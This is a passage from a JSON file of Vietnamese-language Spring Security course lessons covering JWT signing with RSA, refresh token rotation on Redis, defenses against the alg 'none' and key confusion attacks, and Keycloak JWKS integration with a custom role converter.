khai)**: Được phát cho tất cả các microservices khác để kiểm tra con dấu. Dù ai đó có ăn cắp được Public Key thì cũng không bao giờ làm giả được chữ ký!\n:::\n\n---\n\n## 1. Cái này là gì? (Cấu Trúc Kỹ Thuật RFC 7519)\n\nChuỗi JWT gồm 3 phần được mã hóa Base64Url và ngăn cách bởi dấu chấm (`.`):\n\n```\neyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlcyI6WyJBRE1JTiJdfQ.SignatureHashValue...\n[------- 1. HEADER -------] . [------------ 2. PAYLOAD ------------] . [------- 3. SIGNATURE -------]\n```\n\n### Sơ Đồ Quy Trình Phát Hành & Xác Thực JWT Bằng Cặp Khóa RSA:\n\n```mermaid\nflowchart LR\n    subgraph AUTH[\"Auth Service (Identity Provider)\"]\n        U[\"User Login\"] --> SIGN[\"Ký Token bằng PRIVATE KEY (RSA256)\"]\n        SIGN --> JWT[\"Chuỗi JWT Hoàn Chỉnh\"]\n    end\n    \n    JWT --> CLIENT[\"Client (App / Web)\"]\n    \n    subgraph RESOURCE[\"Order Microservice (Resource Server)\"]\n        CLIENT -->|\"Gửi Bearer JWT\"| VERIFY[\"Xác thực bằng PUBLIC KEY\"]\n        VERIFY --> OK[\"Giải mã Payload & Cho phép đặt hàng!\"]\n    end\n    style SIGN fill:#7f1d1d,stroke:#ef4444,stroke-width:2px,color:#fff\n    style VERIFY fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff\n```\n\n---\n\n## 2. Dùng khi nào & Tại sao? (Cơ Chế Refresh Token Rotation)\n\nNếu Access Token có thời hạn ngắn (15 phút), khi hết hạn client phải dùng Refresh Token để xin cấp Access Token mới:\n\n### Sơ Đồ Cơ Chế Refresh Token Rotation (RTR) Phát Hiện Đánh Cắp Token:\n\n```mermaid\nsequenceDiagram\n    participant User as Người Dùng Hợp Lệ\n    participant Hacker as Kẻ Tấn Công (Đánh cắp RT 1)\n    participant Auth as Auth Server (Redis Token Store)\n    \n    User->>Auth: 1. Đổi RT 1 -> Nhận về (AT 2, RT 2 mới). RT 1 bị hủy!\n    Note over Hacker: Hacker cố tình dùng RT 1 cũ để đổi token:\n    Hacker->>Auth: 2. Gửi RT 1 cũ\n    Auth->>Auth: PHÁT HIỆN GIAN LẬN! RT 1 đã từng được sử dụng!\n    Note right of Auth: LẬP TỨC HỦY TOÀN BỘ PHIÊN ĐĂNG NHẬP (RT 2 bị thu hồi)!\n    Auth-->>Hacker: HTTP 401 Unauthorized!\n```\n\n---\n\n## 3. Dùng như thế nào & Phân tích từng dòng code (How-to & Line-by-line Breakdown)\n\nĐịnh nghĩa Record chứa cặp Tokens trả về khi đăng nhập thành công:\n\n```java\npackage vn.mastery.ecommerce.dto;\n\npublic record AuthResponse(\n    String accessToken,\n    String refreshToken,\n    String tokenType,\n    long expiresInSeconds\n) {\n    public static AuthResponse of(String accessToken, String refreshToken, long expiresIn) {\n        return new AuthResponse(accessToken, refreshToken, \"Bearer\", expiresIn);\n    }\n}\n```\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Hiểm họa lưu thông tin nhạy cảm trong Payload**:\n   - Header và Payload của JWT chỉ được mã hóa **Base64Url, KHÔNG HỀ ĐƯỢC MẬT MÃ HÓA (ENCRYPT)**! Bất kỳ ai cũng có thể giải mã xem được nội dung.\n   - **TUYỆT ĐỐI KHÔNG LƯU**: Mật khẩu, số thẻ tín dụng, mã OTP bên trong Payload của JWT!\n"
    },
    {
      "id": "5-2-2",
      "type": "practice",
      "title": "Bài 5.2.2: Triển khai JWT Authentication Filter & Quản lý Token Rotation với Redis",
      "minutes": 8,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Tự tay xây dựng class **`JwtAuthenticationFilter`** kế thừa từ `OncePerRequestFilter`.\n- Trích xuất Bearer Token từ Header `Authorization`, giải mã và nạp `UsernamePasswordAuthenticationToken` vào `SecurityContextHolder`.\n- Lưu trữ và thu hồi Refresh Token theo thời gian thực (Real-time Revocation) trên **Redis**.\n- Đọc hiểu 100% từng dòng code xử lý Filter qua Bảng giải mã chi tiết.\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: ONCE PER REQUEST FILTER\n**Tại sao phải dùng OncePerRequestFilter?**\n- Trong các ứng dụng Web phức tạp, một request có thể được chuyển tiếp nội bộ nhiều lần (Forward, Include, Error Dispatch).\n- Nếu dùng Filter thông thường, code giải mã JWT của bạn có thể bị chạy lại **2-3 lần cho cùng 1 request**, làm tốn CPU giải mã chữ ký vô ích!\n- **`OncePerRequestFilter`** đảm bảo một lời hứa danh dự: *\"Bất kể có chuyện gì xảy ra, bộ lọc này chỉ chạy đúng DUY NHẤT 1 LẦN cho mỗi HTTP Request!\"*.\n:::\n\n---\n\n## 1. Cái này là gì? (Kiến trúc Trích Xuất & Nạp Context)\n\n### Sơ Đồ Xử Lý Của JwtAuthenticationFilter:\n\n```mermaid\nflowchart TD\n    A[\"HTTP Request đến\"] --> B{\"Có Header Authorization:<br/>Bearer eyJ...?\"}\n    B -->|\"KHÔNG\"| C[\"filterChain.doFilter() cho qua tiếp\"]\n    B -->|\"CÓ\"| D[\"Cắt chuỗi bỏ tiền tố 'Bearer '\"]\n    D --> E{\"Giải mã chữ ký & Hạn dùng hợp lệ?\"}\n    E -->|\"KHÔNG (Token giả/hết hạn)\"| F[\"Bỏ qua, không nạp Context\"]\n    E -->|\"HỢP LỆ\"| G[\"Trích xuất Username & Roles\"]\n    G --> H[\"Tạo UsernamePasswordAuthenticationToken\"]\n    H --> I[\"SecurityContextHolder.getContext().setAuthentication(auth)\"]\n    I --> C\n    style I fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff\n    style F fill:#7f1d1d,stroke:#ef4444,stroke-width:2px,color:#fff\n```\n\n---\n\n## 3. Dùng như thế nào & Phân tích từng dòng code (How-to & Line-by-line Breakdown)\n\nMã nguồn chuẩn của `JwtAuthenticationFilter`:\n\n```java\npackage vn.mastery.ecommerce.security;\n\nimport jakarta.servlet.FilterChain;\nimport jakarta.servlet.ServletException;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport org.springframework.security.authentication.UsernamePasswordAuthenticationToken;\nimport org.springframework.security.core.authority.SimpleGrantedAuthority;\nimport org.springframework.security.core.context.SecurityContextHolder;\nimport org.springframework.security.web.authentication.WebAuthenticationDetailsSource;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.filter.OncePerRequestFilter;\nimport java.io.IOException;\nimport java.util.List;\n\n@Component\npublic class JwtAuthenticationFilter extends OncePerRequestFilter {\n\n    private final JwtTokenService jwtTokenService;\n\n    public JwtAuthenticationFilter(JwtTokenService jwtTokenService) {\n        this.jwtTokenService = jwtTokenService;\n    }\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,\n                                    FilterChain filterChain) throws ServletException, IOException {\n        String authHeader = request.getHeader(\"Authorization\");\n\n        // 1. Kiểm tra định dạng Header\n        if (authHeader == null || !authHeader.startsWith(\"Bearer \")) {\n            filterChain.doFilter(request, response);\n            return;\n        }\n\n        String jwt = authHeader.substring(7); // Cắt bỏ \"Bearer \"\n\n        // 2. Xác thực và trích xuất thông tin\n        if (jwtTokenService.isTokenValid(jwt) && SecurityContextHolder.getContext().getAuthentication() == null) {\n            String username = jwtTokenService.extractUsername(jwt);\n            List<SimpleGrantedAuthority> authorities = jwtTokenService.extractAuthorities(jwt);\n\n            // 3. Tạo Authentication Token và nạp vào Context\n            var authToken = new UsernamePasswordAuthenticationToken(username, null, authorities);\n            authToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));\n            SecurityContextHolder.getContext().setAuthentication(authToken);\n        }\n\n        // 4. Cho phép request đi tiếp qua các trạm gác sau\n        filterChain.doFilter(request, response);\n    }\n}\n```\n\n### Bảng Giải Mã Chi Tiết Từng Dòng Code:\n\n| Dòng code | Cú pháp | Ý nghĩa kỹ thuật | Tác động hệ thống |\n|---|---|---|---|\n| `authHeader.substring(7)` | Cắt chuỗi chuỗi tiêu chuẩn | Lấy chuỗi mã hóa JWT thực sự phía sau tiền tố `Bearer ` | Chuẩn bị dữ liệu để đưa vào bộ giải mã |\n| `SecurityContextHolder... == null` | Kiểm tra trạng thái hiện tại | Chỉ nạp nếu request chưa từng được xác thực trước đó | Tránh ghi đè nếu đã có cơ chế xác thực khác |\n| `new UsernamePasswordAuthenticationToken(...)` | Tạo đối tượng xác thực | Đóng gói Principal (username), Credentials (null) và Danh sách Quyền hạn (Authorities) | Spring Security hiểu rằng người dùng này đã được chứng thực thành công |\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Hiểm họa nuốt lỗi trong Filter làm sập API**:\n   - Nếu trong Filter bạn ném thẳng `throw new RuntimeException()`, Spring `@RestControllerAdvice` sẽ **KHÔNG THỂ BẮT ĐƯỢC** vì Filter nằm ngoài phạm vi của DispatcherServlet!\n   - Khắc phục: Dùng `HandlerExceptionResolver` để chuyển tiếp ngoại lệ sang cho ControllerAdvice xử lý.\n"
    },
    {
      "id": "5-2-3",
      "type": "pitfall",
      "title": "Bài 5.2.3: Cạm bẫy Lỗ hổng Thuật toán 'none', Lưu Sensitive Data trong Payload & Rò rỉ Token",
      "minutes": 7,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Giải mã lỗ hổng bảo mật kinh điển: **Thuật toán `alg: \"none\"`** qua mặt các thư viện JWT lỏng lẻo.\n- Chặn đứng cuộc tấn công tráo đổi thuật toán: **Key Confusion Attack** (Dùng Public Key RSA làm Secret Key HMAC).\n- Thiết lập thời gian sống ngắn hạn an toàn cho Access Token (10 - 15 phút) và thu hồi tức thì qua Redis Blacklist.\n- Đọc hiểu bảng phân tích các lỗ hổng bảo mật token phổ biến nhất OWASP Top 10.\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: LỖ HỔNG THUẬT TOÁN \"NONE\"\n**Hình tượng \"Tấm séc ngân hàng tự chọn chế độ không cần chữ ký\":**\n- Bạn cầm một tấm séc ghi: *\"Ngân hàng hãy chuyển cho tôi 100 tỷ đồng\"*.\n- Trong quy định của tấm séc có ô: \"Thuật toán kiểm tra chữ ký\".\n- Kẻ gian khôn lỏi điền vào ô đó: **`alg: \"none\"` (Nghĩa là: Không cần chữ ký nào cả!)** và xóa sạch chữ ký ở cuối.\n- Nếu nhân viên ngân hàng (Thư viện JWT cũ) ngây thơ đọc thấy `alg: none` liền gật đầu: *\"À, tấm séc này yêu cầu không cần ký tên!\"* và chuyển ngay 100 tỷ!\n- Các thư viện hiện đại ngày nay **CẤM TUYỆT ĐỐI** thuật toán `none` và bắt buộc phải chỉ định thuật toán tin cậy từ trước!\n:::\n\n---\n\n## 1. Cái này là gì? (Bản chất Lỗ hổng Key Confusion)\n\nKẻ tấn công lấy **Public Key** của hệ thống (vốn được công khai cho tất cả mọi người) và dùng nó như một Secret Key để ký một JWT giả mạo bằng thuật toán **HMAC-SHA256 (HS256)**. Nếu server không kiểm tra chặt chẽ thuật toán trong Header, server sẽ dùng chính Public Key đó để xác thực và chấp nhận token giả!\n\n### Sơ Đồ Chặn Đứng Cuộc Tấn Công Key Confusion Trong Spring Boot:\n\n```mermaid\nflowchart TD\n    A[\"Hacker gửi Token giả mạo Header: alg: HS256\"] --> B[\"JwtParser của Server\"]\n    B --> C{\"Thuật toán trong Header có phải là RS256 chuẩn không?\"}\n    C -->|\"KHÔNG (Là HS256 hoặc none)\"| ERR[\"REJECT TỨC THÌ!<br/>Ném BadCredentialsException!\"]\n    C -->|\"ĐÚNG LÀ RS256\"| D[\"Tiến hành xác thực bằng Public Key\"]\n    style ERR fill:#7f1d1d,stroke:#ef4444,stroke-width:2px,color:#fff\n    style D fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff\n```\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Luôn chỉ định tường minh thuật toán xác thực**:\n   - Khi cấu hình JwtDecoder, luôn cố định thuật toán được phép: `NimbusJwtDecoder.withPublicKey(key).signatureAlgorithm(SignatureAlgorithm.RS256).build()`.\n"
    },
    {
      "id": "5-2-4",
      "type": "synthesis",
      "title": "Bài 5.2.4: Tổng Kết Thực Chiến: Bản Đồ Vòng Đời JWT & Kỹ Thuật Refresh Token Rotation với Redis",
      "minutes": 8,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Tổng hợp toàn bộ kiến thức Chuyên đề 5.2 thành Bản đồ Quản trị Vòng đời Phiên Đăng Nhập (Session-less Token Lifecycle).\n- Nắm chắc kiến trúc kết hợp: Access Token ngắn hạn trong bộ nhớ + Refresh Token có trạng thái trên Redis.\n- Sẵn sàng bước sang Chuyên đề 5.3 (Tích hợp Hệ thống Đăng nhập Tập trung Keycloak SSO & OAuth2 Resource Server).\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: TỔNG KẾT BẢO MẬT TOKEN\nChúng ta đã hoàn thiện hệ thống xác thực Stateless chuẩn công nghiệp:\n- **Tốc độ ánh sáng**: 99% các request được xác thực độc lập tại chỗ bằng chữ ký số RSA mà không cần chọc vào database.\n- **Bảo mật tối đa**: Thời gian sống của Access Token chỉ vỏn vẹn 15 phút.\n- **Khả năng thu hồi tức thì**: Bất cứ khi nào người dùng bấm \"Đăng xuất\" hoặc đổi mật khẩu, Refresh Token trên Redis bị xóa sổ ngay lập tức!\n:::\n\n---\n\n## 1. Cái này là gì? (Bản Đồ Kiến Trúc Toàn Cảnh Chuyên Đề 5.2)\n\n### Sơ Đồ Luồng: Vòng Đời Hoàn Chỉnh Của Token Trong Hệ Sinh Thái Microservices:\n\n```mermaid\nflowchart TD\n    subgraph LOGIN[\"1. Đăng Nhập Ban Đầu\"]\n        L1[\"User nộp User/Pass\"] --> L2[\"Auth Service kiểm tra\"]\n        L2 --> L3[\"Sinh AT (15m) + RT (7 ngày)\"]\n        L3 --> L4[\"Lưu RT hash vào Redis (Whitelist)\"]\n    end\n    \n    subgraph API_CALL[\"2. Gọi API Bình Thường\"]\n        A1[\"Client gửi Bearer AT\"] --> A2[\"Resource Server xác thực bằng Public Key\"]\n        A2 --> A3[\"Thực thi nghiệp vụ (Không gọi DB Auth!)\"]\n    end\n    \n    subgraph REFRESH[\"3. Khi AT Hết Hạn\"]\n        R1[\"Client gửi RT lên Auth Service\"] --> R2{\"RT có trong Redis không?\"}\n        R2 -->|\"CÓ\"| R3[\"Hủy RT cũ, sinh RT mới (Rotation) + AT mới\"]\n        R2 -->|\"KHÔNG\"| R4[\"Từ chối! Bắt buộc đăng nhập lại!\"]\n    end\n    style L4 fill:#1e3a8a,stroke:#3b82f6,stroke-width:2px,color:#fff\n    style A3 fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff\n    style R3 fill:#4c1d95,stroke:#8b5cf6,stroke-width:2px,color:#fff\n```\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Checklist tốt nghiệp Chuyên đề 5.2**:\n   - [ ] Sử dụng thuật toán ký số bất đối xứng RSA256 thay vì khóa đối xứng bí mật dùng chung.\n   - [ ] Triển khai `OncePerRequestFilter` cho `JwtAuthenticationFilter`.\n   - [ ] Tuyệt đối không lưu dữ liệu nhạy cảm vào Payload.\n   - [ ] Áp dụng Refresh Token Rotation kết hợp Redis để phát hiện gian lận.\n"
    },
    {
      "id": "5-3-1",
      "type": "theory",
      "title": "Bài 5.3.1: Kiến trúc OAuth2 Resource Server, JWKS Endpoint & Cơ chế Phân quyền Keycloak",
      "minutes": 8,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Hiểu vai trò của Keycloak trong vai trò là Identity and Access Management (IAM) Server tập trung.\n- Nắm vững cơ chế hoạt động của **JWKS (JSON Web Key Set)** endpoint: Resource Server tự động kéo Public Keys về cache.\n- Cấu hình Spring Boot làm **OAuth2 Resource Server** chỉ với 3 dòng cấu hình trong `application.yml`.\n- Đọc hiểu 100% từng dòng cấu hình và payload của Keycloak token qua Bảng giải mã chi tiết.\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: KEYCLOAK VÀ JWKS ENDPOINT\n**Hình tượng \"Đại sứ quán cấp hộ chiếu số quốc tế\":**\n- Thay vì mỗi microservice (`order-service`, `product-service`) phải tự lập bảng tài khoản mật khẩu người dùng:\n- Bạn thuê một tổ chức chuyên nghiệp quản lý định danh: **Keycloak (Đại sứ quán)**.\n- Khi người dùng đăng nhập tại Keycloak, Keycloak đóng dấu hộ chiếu bằng một con tem số bí mật.\n- **JWKS Endpoint (`/protocol/openid-connect/certs`)**:\n  - Giống như cuốn cẩm nang nhận diện chữ ký mà Đại sứ quán phát công khai trên mạng.\n  - Khi `order-service` nhận được hộ chiếu của khách, nó chỉ cần đối chiếu với con dấu trong cuốn cẩm nang JWKS để biết ngay đây là khách VIP hay khách thường!\n:::\n\n---\n\n## 1. Cái này là gì? (Kiến trúc OAuth2 Resource Server)\n\nTrong chuẩn OAuth2, **Resource Server** (ứng dụng Spring Boot của bạn) là nơi lưu trữ dữ liệu được bảo vệ. Resource Server tin tưởng vào **Authorization Server** (Keycloak) thông qua đường dẫn kiểm định khóa công khai `jwk-set-uri`.\n\n### Sơ Đồ Cơ Chế Nạp Khóa Công Khai Qua JWKS:\n\n```mermaid\nsequenceDiagram\n    participant Keycloak as Keycloak Server (:8080)\n    participant Spring as Spring Boot Resource Server (:8081)\n    participant Client as Frontend User\n    \n    Spring->>Keycloak: 1. Khởi động: GET /realms/ecommerce/protocol/openid-connect/certs\n    Keycloak-->>Spring: 2. Trả về JWKS (Danh sách Public Keys) & Cache vào RAM\n    \n    Client->>Spring: 3. Gửi Request: GET /api/orders kèm Bearer Token (Keycloak cấp)\n    Spring->>Spring: 4. Dùng Public Key đã cache để xác thực con dấu tại chỗ! (0ms round-trip)\n    Spring-->>Client: 5. Trả về dữ liệu đơn hàng thành công!\n```\n\n---\n\n## 2. Dùng khi nào & Tại sao? (Cấu hình Spring Boot 3 Chuẩn)\n\n### Cấu hình trong `src/main/resources/application.yml`:\n\n```yaml\nspring:\n  security:\n    oauth2:\n      resourceserver:\n        jwt:\n          # URL trỏ tới Realm của Keycloak\n          issuer-uri: http://localhost:8180/realms/ecommerce-realm\n          # Endpoint cung cấp danh sách Public Keys để verify chữ ký\n          jwk-set-uri: http://localhost:8180/realms/ecommerce-realm/protocol/openid-connect/certs\n```\n\n### Bảng Giải Mã Cấu Hình OAuth2 Resource Server:\n\n| Thuộc tính | Ý nghĩa kỹ thuật | Cơ chế hoạt động ngầm |\n|---|---|---|\n| `issuer-uri` | Địa chỉ của Authorization Server | Spring Security kiểm tra trường `iss` trong JWT payload phải trùng khớp 100% |\n| `jwk-set-uri` | Endpoint cấp chứng chỉ số công khai | Spring Boot tự động khởi tạo `NimbusJwtDecoder` và tự động refresh key khi có rotation |\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Hiểm họa lỗi mạng lúc khởi động do Keycloak chưa bật**:\n   - Mặc định Spring Boot sẽ ping `issuer-uri` ngay lúc bật app. Nếu Keycloak chưa khởi động xong, Spring Boot sẽ dừng lại với lỗi `BeanCreationException`.\n   - Khắc phục: Dùng `jwk-set-uri` kết hợp cấu hình retry hoặc đảm bảo Docker compose bật Keycloak trước.\n"
    },
    {
      "id": "5-3-2",
      "type": "practice",
      "title": "Bài 5.3.2: Tích hợp Keycloak SSO với Custom JwtAuthenticationConverter & Method Security",
      "minutes": 8,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Giải mã lỗi kinh điển: **Keycloak lưu roles trong `realm_access.roles`**, trong khi Spring Security lại mặc định tìm trong claim `scope` hoặc `scp`.\n- Tự tay viết **`JwtAuthenticationConverter`** để trích xuất roles từ Keycloak và tự động gắn tiền tố chuẩn `ROLE_`.\n- Áp dụng bảo vệ cấp phương thức với **`@PreAuthorize(\"hasRole('ADMIN')\")`**.\n- Đọc hiểu 100% từng dòng code chuyển đổi Claim qua Bảng giải mã chi tiết.\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: PHIÊN DỊCH VIÊN CLAIM TRONG TOKEN\n**Hình tượng \"Người phiên dịch giữa tiếng Anh và tiếng Pháp\":**\n- Trong tấm thẻ của Keycloak (JWT), chức vụ của bạn được viết bằng tiếng Pháp ở góc trái: `\"realm_access\": { \"roles\": [\"admin\", \"customer\"] }`.\n- Nhưng người gác cổng Spring Security lại chỉ đọc được tiếng Anh ở góc phải: Thẻ phải có chữ `ROLE_ADMIN`!\n- Nếu không có người phiên dịch, Spring Security sẽ phán: *\"Thẻ này không có chức vụ gì cả, tôi coi bạn là khách vô danh!\"*.\n- **`JwtAuthenticationConverter` chính là người phiên dịch mẫn cán**:\n  - Nó mở góc `realm_access.roles` ra.\n  - Lấy từng role ra và gắn thêm chữ **`ROLE_`** vào đầu (`ROLE_ADMIN`).\n  - Giao lại cho Spring Security -> Cánh cửa lập tức mở ra!\n:::\n\n---\n\n## 1. Cái này là gì?\n\n\n### Sơ Đồ Kiến Trúc: Bộ Chuyển Đổi Quyền Hạn Keycloak (JwtAuthenticationConverter)\n\n```mermaid\nflowchart TD\n    Client[\"📱 Client Request (Header: Bearer JWT)\"] --> Filter[\"🛡️ BearerTokenAuthenticationFilter\"]\n    Filter --> Parser[\"⚙️ NimbusJwtDecoder (Verify Signature via JWKS)\"]\n    Parser --> Claims[\"📜 JWT Claims JSON<br/>{ realm_access: { roles: ['ADMIN', 'MANAGER'] } }\"]\n    \n    subgraph CONVERTER [\"Custom JwtAuthenticationConverter\"]\n        Claims --> Extract[\"🔍 Trích xuất mảng roles từ realm_access\"]\n        Extract --> Prefix[\"🏷️ Gắn tiền tố 'ROLE_'<br/>ROLE_ADMIN, ROLE_MANAGER\"]\n        Prefix --> Auth[\"🏛️ JwtAuthenticationToken(Principal, Authorities)\"]\n    end\n    \n    Auth --> Context[\"🔒 SecurityContextHolder.getContext()\"]\n    Context --> MethodSec[\"🎯 @PreAuthorize(\"hasRole('ADMIN')\") -> Cho phép truy cập!\"]\n\n    style CONVERTER fill:#0f172a,stroke:#38bdf8,stroke-width:2px,color:#fff\n```\n\n### Bảng So Sánh Cấu Trúc Quyền: Spring Security Mặc Định vs Keycloak SSO:\n\n| Tiêu chí | Spring Security 6 Mặc Định | Cấu Trúc Của Keycloak SSO | Giải pháp xử lý |\n|---|---|---|---|\n| **Vị trí Claim** | `scope` hoặc `scp` dạng chuỗi cách nhau bằng dấu cách | `realm_access.roles` dạng JSON Array lồng nhau | Viết `Converter<Jwt, Collection<GrantedAuthority>>` |\n| **Quy ước Tiền tố** | Yêu cầu tiền tố bắt buộc: `ROLE_` | Trả về tên quyền thuần: `ADMIN`, `USER` | Tự động cộng chuỗi: `\"ROLE_\" + roleName` |\n| **Phân quyền Phương thức** | `@PreAuthorize(\"hasRole('ADMIN')\")` | `@PreAuthorize(\"hasAuthority('ADMIN')\")` nếu không đổi prefix | Chuẩn hóa toàn bộ về `hasRole` theo chuẩn Spring |\n (Cấu Trúc Claim Của Keycloak)\n\nJSON Payload mà Keycloak sinh ra có cấu trúc phân cấp đặc thù:\n\n```json\n{\n  \"sub\": \"user-uuid-12345\",\n  \"preferred_username\": \"boss_nguyen\",\n  \"realm_access\": {\n    \"roles\": [\"admin\", \"finance_manager\"]\n  },\n  \"resource_access\": {\n    \"order-service\": {\n      \"roles\": [\"order_creator\"]\n    }\n  }\n}\n```\n\n---\n\n## 3. Dùng như thế nào & Phân tích từng dòng code (How-to & Line-by-line Breakdown)\n\nTriển khai Converter phiên dịch quyền hạn chuẩn Senior:\n\n```java\npackage vn.mastery.ecommerce.security;\n\nimport org.springframework.core.convert.converter.Converter;\nimport org.springframework.security.authentication.AbstractAuthenticationToken;\nimport org.springframework.security.core.GrantedAuthority;\nimport org.springframework.security.core.authority.SimpleGrantedAuthority;\nimport org.springframework.security.oauth2.jwt.Jwt;\nimport org.springframework.security.oauth2.server.resource.authentication.JwtAuthenticationToken;\nimport org.springframework.stereotype.Component;\nimport java.util.Collection;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.stream.Collectors;\n\n@Component\npublic class KeycloakJwtAuthenticationConverter implements Converter<Jwt, AbstractAuthenticationToken> {\n\n    @Override\n    @SuppressWarnings(\"unchecked\")\n    public AbstractAuthenticationToken convert(Jwt jwt) {\n        // 1. Trích xuất mảng roles từ realm_access\n        Map<String, Object> realmAccess = jwt.getClaim(\"realm_access\");\n        Collection<GrantedAuthority> authorities = List.of();\n\n        if (realmAccess != null && realmAccess.containsKey(\"roles\")) {\n            List<String> roles = (List<String>) realmAccess.get(\"roles\");\n            // 2. Chuyển đổi thành SimpleGrantedAuthority có prefix ROLE_\n            authorities = roles.stream()\n                .map(role -> new SimpleGrantedAuthority(\"ROLE_\" + role.toUpperCase()))\n                .collect(Collectors.toList());\n        }\n\n        // 3. Sử dụng preferred_username làm Principal Name thay vì UUID dài loằng ngoằng\n        String principalClaimName = jwt.getClaimAsString(\"preferred_username\");\n        return new JwtAuthenticationToken(jwt, authorities, principalClaimName);\n    }\n}\n```\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Đăng ký Converter vào HttpSecurity**:\n   - Đừng quên gắn converter vào cấu hình: `http.oauth2ResourceServer(oauth2 -> oauth2.jwt(jwt -> jwt.jwtAuthenticationConverter(keycloakConverter)))`.\n"
    },
    {
      "id": "5-3-3",
      "type": "pitfall",
      "title": "Bài 5.3.3: Cạm bẫy Không Caching JWKS Làm Nghẽn Mạng Keycloak & Lệch Prefix 'ROLE_'",
      "minutes": 7,
      "content": "\n### Sơ Đồ Cảnh Báo: Bão Request JWKS Gây Sập Keycloak vs Cơ Chế Caching 24H\n\n```mermaid\nsequenceDiagram\n    autonumber\n    actor Client as 📱 10,000 Clients Đồng Thời\n    participant API as 🌐 Order Service (Resource Server)\n    participant Cache as ⚡ In-Memory JWKS Cache (Caffeine)\n    participant KC as 🏛️ Keycloak Auth Server (/certs)\n\n    Note over Client,KC: NGUY CƠ: KHÔNG CACHE JWKS\n    Client->>API: 10,000 Request kèm JWT Bearer\n    API->>KC: 10,000 HTTP Request xin Public Key cùng lúc!\n    Note over KC: Sập CPU Keycloak -> 504 Gateway Timeout!\n\n    Note over Client,KC: GIẢI PHÁP: CACHING PUBLIC KEY VỚI TTL 24H\n    Client->>API: Request kèm JWT (Header: kid='key-123')\n    API->>Cache: Kiểm tra 'key-123' có trong cache không?\n    Cache-->>API: Cache Hit! Trả về RSA Public Key ngay trong 0.01ms\n    Note over API: Xác thực chữ ký số tại chỗ, không tốn 1 byte mạng ra ngoài!\n```\n\n### Bảng Ma Trận Cạm Bẫy JWKS & Giải Pháp Khắc Phục:\n\n| Vấn đề sự cố | Hậu quả sản xuất | Nguyên nhân gốc rễ | Giải pháp kỹ thuật chuẩn |\n|---|---|---|---|\n| **JWKS Network Storm** | Keycloak sập CPU 100%, toàn bộ microservice tê liệt | Mỗi request xác thực JWT đều gọi HTTP sang Keycloak `/certs` | Bật Cache cho JWKS với TTL 24 giờ và refresh bất đồng bộ |\n| **Key Rotation Lockout** | Người dùng bị 401 khi Keycloak đổi cặp khóa mới | Cache giữ khóa cũ quá lâu, không biết có khóa mới | Cho phép tìm kiếm cưỡng bức (force refresh) khi gặp `kid` lạ |\n| **Lệch Prefix ROLE_** | User có role `ADMIN` trong token nhưng vẫn bị 403 Forbidden | Spring Security `hasRole('ADMIN')` tự ngầm tìm `ROLE_ADMIN` | Bổ sung tiền tố `ROLE_` trong Converter hoặc dùng `hasAuthority('ADMIN')` |\n\n\n\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Nhận diện hiểm họa nghẽn mạng sập cụm Keycloak khi hàng nghìn request đổ về khiến Resource Server liên tục gọi JWKS endpoint.\n- Cấu hình bộ nhớ đệm Cache chuẩn cho JWKS với TTL 24 giờ.\n- Xử lý xung đột prefix `ROLE_` giữa Spring Security và hệ thống phân quyền bên thứ ba.\n- Đọc hiểu bảng phân tích lưu lượng mạng và giải pháp caching tại chỗ.\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: TẠI SAO PHẢI CACHE JWKS?\n- Nếu mỗi khi một khách hàng vào mua hàng, `order-service` lại chạy sang Keycloak hỏi: *\"Cho tôi xin lại Public Key để kiểm tra!\"*:\n- Với 10,000 khách mua hàng cùng lúc -> Keycloak phải trả lời 10,000 cuộc gọi lấy chìa khóa -> **Keycloak lăn đùng ra chết vì kiệt sức (DDoS)**!\n- **Giải pháp**: Lấy Public Key về một lần, lưu vào ngăn kéo (Cache trong 24 giờ). Cứ thế lấy ra kiểm tra, không làm phiền Keycloak nữa!\n:::\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Xử lý khi Keycloak thực hiện Key Rotation**:\n   - Khi Keycloak xoay vòng khóa mới, token mới sẽ có header `kid` (Key ID) mới.\n   - Thư viện Nimbus của Spring Security đủ thông minh để **tự động xóa cache và kéo lại JWKS mới** khi gặp một `kid` lạ chưa từng thấy trong cache!\n"
    },
    {
      "id": "5-3-4",
      "type": "synthesis",
      "title": "Bài 5.3.4: Tổng Kết Thực Chiến: Bản Đồ Phân Quyền Keycloak & Ma Trận RBAC Phân Tầng Microservices",
      "minutes": 8,
